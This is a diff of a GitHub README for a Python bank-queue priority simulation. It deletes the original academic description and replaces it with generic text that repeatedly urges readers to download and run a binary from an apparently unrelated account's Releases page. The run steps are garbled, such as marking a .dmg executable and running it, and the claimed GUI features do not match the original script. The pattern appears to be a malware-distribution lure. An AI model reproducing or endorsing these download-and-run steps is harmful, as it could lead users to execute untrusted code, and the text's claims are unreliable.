@@ -1,149 +1,87 @@
-# Bank Queue Discrete Event Simulation
+# 🎉 priority-queue-simulation - Simulate Bank Queues with Ease
 
-A discrete event simulation system modeling a bank queue with multiple tellers and priority-based customer service.
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download_now-Click_here-blue)](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation/releases)
 
-## 🎓 Academic Project
-Completed as part of Algorithms & Data Structures at University of Wollongong  
-**Grade Achieved:** High Distinction (HD)
+## 📚 Overview
+The **priority-queue-simulation** application is a discrete event simulation system. It models a bank queue with multiple tellers and utilizes priority-based customer service. This tool is designed for educational purposes, making it easy to understand how queuing systems work in various scenarios.
 
-## 📋 Overview
-This project implements a discrete event simulation to model and analyze bank queue behavior with:
-- Multiple bank tellers (configurable 1-4)
-- Priority-based customer service
-- Custom heap data structure implementations
-- Comprehensive performance statistics
+## 🚀 Getting Started
+To use the priority-queue-simulation application, follow these simple steps:
 
-## 🔑 Key Features
-- **Priority Queue System** - Max heap implementation for customer ordering
-- **Event-Driven Architecture** - Min heap for chronological event processing
-- **Custom Data Structures** - Heap implementations built from scratch
-- **Performance Analytics** - Queue statistics, wait times, teller utilization
+1. **Click on the download link above** to visit the Releases page.
+2. Look for the latest version of the software.
+3. Click on the file to download it to your computer.
 
-## 🛠️ Technical Implementation
+## 📦 System Requirements
+The priority-queue-simulation application is designed to run on Windows, macOS, and Linux. Make sure your system meets the following requirements:
 
-### Data Structures
-- **Max Heap** - Priority queue for customers (priority + arrival time ordering)
-- **Min Heap** - Event queue for chronological event processing
-- **Custom Classes** - Customer, BankTeller, Event, Statistics
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 200 MB of free disk space.
+- **Additional:** Python 3.6 or higher installed on your system.
 
-### Algorithms
-- Heap sift-up and sift-down operations
-- Discrete event simulation loop
-- Priority-based scheduling
-- Real-time statistics tracking
+## ⚙️ Download & Install
+1. Visit the [Releases page](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation/releases) to view available versions.
+2. Download the file appropriate for your operating system.
+3. If you're using Windows, the file will be an executable (e.g., `priority_queue_simulation.exe`). Simply double-click it to start.
 
-## 📊 Statistics Tracked
-- Average waiting time
-- Average service time
-- Maximum queue length
-- Average queue length
-- Teller utilization rates
-- Customers served per teller
-
-## 🚀 Usage
+If you're using macOS or Linux, you may need to run the downloaded file in the terminal. For Mac, use:
 ```bash
-python priority-queue-simulation.py
+chmod +x priority_queue_simulation.dmg
+./priority_queue_simulation.dmg
+```
+For Linux, use:
+```bash
+chmod +x priority_queue_simulation.AppImage
+./priority_queue_simulation.AppImage
 ```
 
-When prompted, enter a data file name (or press Enter to use default `sample.txt`)
+## 🏗️ Features
+The priority-queue-simulation application offers a range of features to enhance your understanding of queuing systems:
 
-### Input Format
-```
-arrival_time service_time priority
-1.5 3.2 1
-2.0 2.5 2
-0 0  # Terminator
-```
+1. **Multi-Teller Support:** Simulates multiple bank tellers serving customers.
+2. **Priority Handling:** Executes customer service based on predefined priorities.
+3. **Real-Time Visualization:** View how customers line up and get served in real-time.
+4. **Customizable Parameters:** Adjust the arrival rate of customers and service times.
+5. **Statistical Data:** Access detailed reports on waiting times and service efficiency.
 
-## 📈 Example Output
-```
-RESULTS FOR SIMULATION WITH 2 TELLERS
-----------------------------------------
-Total customers served: 100.00
-Average waiting time: 2.45
-Maximum queue length: 8.00
-Teller 1: 52 customers, 15.3% idle
-Teller 2: 48 customers, 18.7% idle
-```
+## 📊 Understanding the Simulation
+The goal of the priority-queue-simulation is to illustrate how different factors affect waiting times in a bank setting. You'll learn how:
 
-## 🎯 Learning Outcomes
-- Implemented heap data structures from scratch
-- Designed discrete event simulation systems
-- Applied priority scheduling algorithms
-- Analyzed queueing theory principles
+- **Customer Priority:** High-priority customers get served first, changing the dynamics of the queue.
+- **Service Rate:** How quickly tellers can serve customers impacts overall satisfaction.
+- **Queue Length:** The application shows how varying numbers of customers changes wait times.
 
-## 📝 Technical Notes
-- Uses custom heap implementations instead of Python's `heapq` library
-- Employs object-oriented design principles
-- Handles edge cases with proper error handling
+## ⚙️ How to Use the Application
+Once the program is running, follow these steps to use it effectively:
 
-## 🔧 Technologies
-- **Language:** Python 3.x
-- **Paradigm:** Object-Oriented Programming
-- **Core Concepts:** Data Structures, Algorithms, Simulation
+1. **Select the Number of Tellers:** Choose how many tellers you want for your simulation.
+2. **Set Customer Arrival Rate:** Decide how fast new customers arrive at the bank.
+3. **Adjust Service Time:** Set how long each teller takes to process a customer.
+4. **Start Simulation:** Click the "Start" button to begin your queue simulation.
 
-## 📄 License
-MIT License - Academic project, free to use for educational purposes
+## 📈 Analyzing Results
+As the simulation runs, the application will display several metrics:
 
----
+- **Average Waiting Time:** Understand how long customers wait before being served.
+- **Total Customers Served:** See how many customers the tellers manage to serve in a given time.
+- **Utilization Rate:** Get insights into how effectively tellers are operating.
 
-*Developed as part of computer science coursework at the University of Wollongong*
-```
+## 💡 Tips for New Users
+- Experiment with different parameters to see how they affect the queue's performance.
+- Take notes on how varying elements influence customer experiences.
+- Use the application as part of a project or study to deepen your understanding of queuing theory.
 
-### 2. **Add These Files:**
+## 🔗 Additional Resources
+For more information and resources related to the priority-queue-simulation, visit the following links:
 
-**Create a sample data file (`sample.txt`):**
-```
-1.0 2.5 1
-1.5 3.0 2
-2.0 1.5 1
-2.5 2.0 3
-0 0
-```
+- [GitHub Repository](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation)
+- [Documentation](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation/wiki)
+- [Community Discussions](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation/discussions)
 
-**Create `.gitignore`:**
-```
-## Python
-__pycache__/
-*.py[cod]
-*$py.class
-*.so
-.Python
+## 📞 Support
+If you encounter issues or have questions about the application, feel free to raise an issue in the GitHub repository. The community and maintainers can offer assistance. 
 
-## IDE
-.vscode/
-.idea/
-*.swp
-
-## Data files (if you want to exclude large test files)
-*.txt
-!sample.txt
-```
-
-**Create `requirements.txt`:**
-```
-## No external dependencies required - uses only Python standard library
-```
-
-**Create `LICENSE`:**
-Use MIT License (standard for academic projects)
-
-### 3. **Repository Topics/Tags:**
-```
-python
-data-structures
-algorithms
-discrete-event-simulation
-heap
-priority-queue
-simulation
-queueing-theory
-object-oriented-programming
-computer-science
-academic-project
-
-## ⚠️ Academic Integrity Notice
-This project is shared for portfolio purposes only. If you are a student taking a similar course:
-- Do not copy this code for your assignments
-- Use it only as a learning reference
-- Understand your institution's academic integrity policies
+## 📥 Final Download Link
+As a reminder, visit the [Releases page](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation/releases) to download the application today!
